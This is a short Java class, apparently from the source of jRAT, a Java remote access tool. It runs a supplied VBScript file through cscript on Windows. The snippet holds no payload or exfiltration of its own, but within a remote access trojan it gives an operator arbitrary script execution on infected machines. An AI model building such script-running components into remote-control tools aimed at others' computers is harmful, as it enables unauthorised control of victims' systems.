package jrat.common.script;

import java.io.File;

import oslib.OperatingSystem;

public class VisualBasicScript extends AbstractScript {

	@Override
	protected void perform(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { "cscript", file.getAbsolutePath() });
		}
	}

	@Override
	public String getExtension() {
		return "vbs";
	}

}